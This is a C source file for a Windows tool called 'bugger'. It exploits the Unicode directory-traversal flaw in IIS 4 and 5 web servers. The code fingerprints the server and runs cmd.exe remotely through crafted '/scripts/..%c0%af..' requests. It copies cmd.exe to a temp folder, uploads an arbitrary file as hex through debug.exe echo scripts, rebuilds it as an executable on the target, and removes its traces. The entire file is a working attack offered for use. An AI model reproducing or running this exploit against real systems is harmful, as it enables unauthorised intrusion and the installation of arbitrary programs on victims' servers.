#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

struct sockaddr_in sin;
int sock;
FILE *file;

int usage()
{
	printf("\nusage:\tbugger ip port file\n\n");
	return 0;
}


int send_command(char *str)
{
	char url[2048], buff[2048];
	int err, i;

	strcpy(buff, str);
	for (i = 0; buff[i] != '\0'; i++)
	{
		if ( buff[i] == ' ')
			buff[i] = '+';
	}

	sprintf(url,"GET /scripts/..%%c0%%af../winnt/system32/cmd.exe?/c+%s\n\n", buff);

	if ( (sock = socket( AF_INET, SOCK_STREAM, 0 )) == SOCKET_ERROR)
	{
		printf("Socket error\n");
	}
	else
	{
		if ( (err = connect(sock, (struct sockaddr*)&sin, sizeof(sin))) == SOCKET_ERROR)
		{
			printf("Connect error\n");
		}
		else
		{
			if ( (err = send(sock, url, strlen(url), 0)) == SOCKET_ERROR)
			{
				printf("Send error\n");
			}
			else
			{
				//closesocket(sock);
				//return 0;
				if ( (err = recv(sock, buff, 2048, 0)) == SOCKET_ERROR)
				{
					printf("recv error\n");
				}
				else
				{
					printf("%s\n\n\n", buff);
					//parse ret val
				}
			}
		}
	}
	return 0;

}
int send_echo(char *str)
{
	char url[2048], buff[2048];
	int err, i;
	
	strcpy(buff, str);
	for (i = 0; buff[i] != '\0'; i++)
	{
		if ( buff[i] == ' ')
			buff[i] = '+';
	}
	
	sprintf(url,"GET /scripts/..%%c0%%af../temp/bug.exe?/c+echo+%s+>>c:\\temp\\~01.tmp\n\n", buff);

	if ( (sock = socket( AF_INET, SOCK_STREAM, 0 )) == SOCKET_ERROR)
	{
		printf("Socket error\n");
	}
	else
	{
		if ( (err = connect(sock, (struct sockaddr*)&sin, sizeof(sin))) == SOCKET_ERROR)
		{
			printf("Connect error\n");
		}
		else
		{
			if ( (err = send(sock, url, strlen(url), 0)) == SOCKET_ERROR)
			{
				printf("Send error\n");
			}
			else
			{
				//closesocket(sock);
				//return 0;
				if ( (err = recv(sock, buff, 2048, 0)) == SOCKET_ERROR)
				{
					printf("recv error\n");
				}
				else
				{
					printf("Need to parse the response\n\n");
					//parse ret val
				}
			}
		}
	}

	closesocket(sock);
	return -1;
}

int hit_server()
{
	char url[1024], tmp[1024], *token, buff[2048];
	int err, j=0x100,i,n;

	sprintf(url, "GET %s HTTP/1.0\n\n", "/scripts/");

	if ( (sock = socket( AF_INET, SOCK_STREAM, 0 )) == SOCKET_ERROR)
	{
		printf("Socket error (hit)\n");
		return -1;
	}
	else
	{
		if ( (err = connect(sock, (struct sockaddr*)&sin, sizeof(sin))) == SOCKET_ERROR)
		{
			printf("Connect error (hit)\n");
			return -1;
		}
		else
		{
			if ( (err = send(sock, url, strlen(url), 0)) == SOCKET_ERROR)
			{
				printf("Send error (hit)\n");
				return -1;
			}
			else
			{
				if ( (err = recv(sock, buff, 2048, 0)) == SOCKET_ERROR)
				{
					printf("recv error (hit)\n");
					return -1;
				}
				else
				{
					token=strtok(buff,"\n");
					if (strstr(token,"200"))
					{
						//dir is here
						printf("scripts directory exists...\n");
						//break;
					}
					else if (strstr(token,"404"))
					{
						printf("Error:\tscripts directory not found\n\n");
						return -1;
					}
					
					strcpy(tmp, "No server version returned...\n");
					token=strtok(NULL,"\n");
					while(token)
					{
						if (!strncmp(token,"Server:",7))
						{
							strcpy(tmp, "Server type:\t");
							strcat(tmp,(strchr(token,':')+1));
							break;
						}
						token=strtok(NULL,"\n");
					}
					printf("%s\n", tmp);
					if ( !strstr(tmp, "IIS/5") && !strstr(tmp, "IIS/4") )
					{
						printf("Error:\tProbably not an IIS 4/5 server.\n\n");
						return -1;
					}
				}
			}
		}
	}


	// Now we know what we're dealing with...  start working.
	printf("Copying cmd.exe to c:\\temp...\n");

	send_command("copy+c:\\winnt\\system32\\cmd.exe+c:\\temp\\bug.exe");

	printf("Sending file...\n");

	while ( (n=fread(buff,sizeof(char),24,file))>0)
	{
		//sprintf(url, "e+%x", j);
		//send_echo(url);
		sprintf(tmp, "e %x ", j);
		for (i=0;i<n;i++)
		{
			sprintf(&tmp[strlen(tmp)],"%2.2x ",(unsigned char)buff[i]);
		}
		//printf("sending %d bytes\n", i);
		send_echo(tmp);
		Sleep(200);
		j+=i;
	}

	send_echo("r+cx");
	sprintf(url,"%x",j-0x100);
	send_echo(url);
	send_echo("n+c:\\temp\\01");
	send_echo("w");
	send_echo("q");
	
	// Wait for the echo process to quit
	Sleep(5000);

	printf("File uploaded... starting debug.\n");

	/*
	WTF!?!?!  This next line will cause the bug.exe process to kill ntvdm.exe

	I haven't been able to figure out why it does this...
	*/
	sprintf(url,"GET /scripts/..%%c0%%af../temp/bug.exe?/c+debug+<+c:\\temp\\~01.tmp\n\n");

	if ( (sock = socket( AF_INET, SOCK_STREAM, 0 )) == SOCKET_ERROR)
	{
		printf("Socket error\n");
	}
	else
	{
		if ( (err = connect(sock, (struct sockaddr*)&sin, sizeof(sin))) == SOCKET_ERROR)
		{
			printf("Connect error\n");
		}
		else
		{
			if ( (err = send(sock, url, strlen(url), 0)) == SOCKET_ERROR)
			{
				printf("Send error\n");
			}
			else
			{
				closesocket(sock);
				/*if ( (err = recv(sock, buff, 2048, 0)) == SOCKET_ERROR)
				{
					printf("recv error\n");
				}
				else
				{
					printf("%s\n\n\n", buff);
					//parse ret val
				}*/
			}
		}
	}


	Sleep(45000);  //wait for debug to complete
	send_command("rename c:\\temp\\01 c:\\temp\\01.exe");
	printf("Debug complete... Cleaning up.\n");
	send_command("del+c:\\temp\\~01.tmp");

	return 0;
	}


int main(int argc, char* argv[])
{
	unsigned short port;
	WSADATA wsadata;

	// half-assed sanity checks
	if (argc != 4)
	{
		usage();
		return 0;
	}

	if ( inet_addr(argv[1]) == INADDR_NONE)
	{
		printf("Error:\tInvalid IP.\n");
		usage();
		return 0;
	}

	if (!(port = atoi(argv[2])))
	{
		printf("Error:\tInvalid port.\n\n");
		usage();
		return 0;
	}

	if ( !(file = fopen(argv[3], "rb")) )
	{
		printf("Error:\tCan't open file.\n\n");
		usage();
		return 0;
	}

	// OK... on to business

	WSAStartup(MAKEWORD (2,2), &wsadata );

	sin.sin_addr.s_addr = inet_addr(argv[1]);
	sin.sin_port = htons(port);
	sin.sin_family = AF_INET;

	hit_server();
	
	WSACleanup();

	fclose(file);
	return 0;
}

